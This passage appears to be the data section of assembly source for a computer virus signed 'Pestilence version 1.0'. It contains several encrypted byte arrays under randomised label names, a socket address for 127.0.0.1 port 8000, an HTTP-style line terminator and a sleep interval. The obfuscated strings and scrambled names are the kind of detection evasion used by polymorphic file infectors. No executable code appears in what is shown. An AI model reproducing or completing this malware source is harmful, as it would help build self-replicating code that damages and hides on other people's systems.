qNX8nOAOnl db 0x17, 0x24, 0x1D, 0x4A, 0x5C, 0x77, 0x4C, 0x17, 0x39, 0x4F, 0x74, 0x11, 0x4D, 0x22, 0x1A, 0x4A, 0x5A, 0x31, 0x18, 0x01, 0x2E, 0x78, 0x30, 0x15, 0x41, 0x25, 0x72
J2HYBE equ $ - qNX8nOAOnl
tLvuO0MlT db 0x4B, 0x25, 0x1A, 0x08, 0x4D, 0x3C, 0x50, 0x51, 0x7F, 0x16, 0x62, 0x50, 0x79, 0x17, 0x33, 0x64, 0x6B, 0x6B, 0x2C, 0x1E, 0x2B, 0x64, 0x6A, 0x1C, 0x62, 0x12, 0x3B, 0x14, 0x66, 0x0C, 0x27, 0x51, 0x0B, 0x66, 0x1A, 0x31, 0x71, 0x1D, 0x11, 0x56, 0x6C, 0x3A, 0x0B, 0x1E, 0x2B, 0x14, 0x0F, 0x03, 0x0E, 0x14, 0x4B, 0x71, 0x58, 0x3B, 0x07, 0x0C, 0x32, 0x4D, 0x02, 0x48, 0x48, 0x35, 0x22, 0x4C, 0x42, 0x36, 0x26, 0x1C, 0x08, 0x57, 0x2E, 0x19, 0x7D, 0x3D, 0x1D, 0x51, 0x7A, 0x1B, 0x0C, 0x54, 0x6A, 0x40, 0x34, 0x04, 0x4C, 0x3F, 0x17, 0x65, 0x4C, 0x3D, 0x00, 0x0D, 0x2B, 0x49, 0x5B
vosJuBtukr equ $ - tLvuO0MlT
Bbakfhz:
dw 2 
dw 0x401F 
dd 0x100007F 
dq 0 

Vbbq0sg3I db 0x68, 0x19, 0x21, 0x71, 0x08, 0x77, 0x07, 0x1C, 0x3E, 0x55, 0x3A, 0x13, 0x4C, 0x76, 0x3A, 0x71, 0x7C, 0x08, 0x4D, 0x55, 0x64, 0x16, 0x56, 0x7A, 0x70, 0x39, 0x01, 0x51, 0x12, 0x78, 0x53, 0x56, 0x7D, 0x09, 0x6B, 0x5E, 0x08, 0x78, 0x43, 0x1F, 0x10, 0x68, 0x52, 0x54, 0x47, 0x2D, 0x18, 0x1F, 0x56, 0x22, 0x17, 0x4B, 0x5C, 0x75, 0x36, 0x1D, 0x3A, 0x42, 0x61, 0x50, 0x4C, 0x33, 0x0A, 0x51, 0x07, 0x28, 0x0E, 0x05, 0x23, 0x49, 0x56, 0x7A, 0x7B, 0x39, 0x1C, 0x51, 0x4D, 0x36, 0x16, 0x49, 0x06, 0x42, 0x35, 0x17, 0x4C, 0x3E, 0x48, 0x05, 0x28
CR4kFuzIHu equ $ - Vbbq0sg3I
s9ncnZ6AJf db 0x0D, 0x0A, 0x0D, 0x0A, 0x0 
EFhWwSV equ $ - s9ncnZ6AJf
swCLxSthi db 0x7F, 0x13, 0x26, 0x05, 0x07, 0x31, 0x0C, 0x02, 0x2F, 0x44, 0x2F, 0x19, 0x57, 0x38, 0x52, 0x6D, 0x7C, 0x0C, 0x32, 0x4B, 0x7B, 0x09, 0x6A, 0x7D, 0x32, 0x1E, 0x1D, 0x56, 0x5C, 0x62, 0x42, 0x55, 0x78, 0x10, 0x75, 0x40, 0x16, 0x66, 0x5C, 0x14, 0x12, 0x60, 0x52, 0x54, 0x7A, 0x2A, 0x51, 0x7D, 0x32, 0x56
Ez02jH5ZmU equ $ - swCLxSthi
AhKzsWv:
dq 0 
dq 10000000 

FljGYleW db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0 
knxYMul equ $ - FljGYleW
zxzpDq: 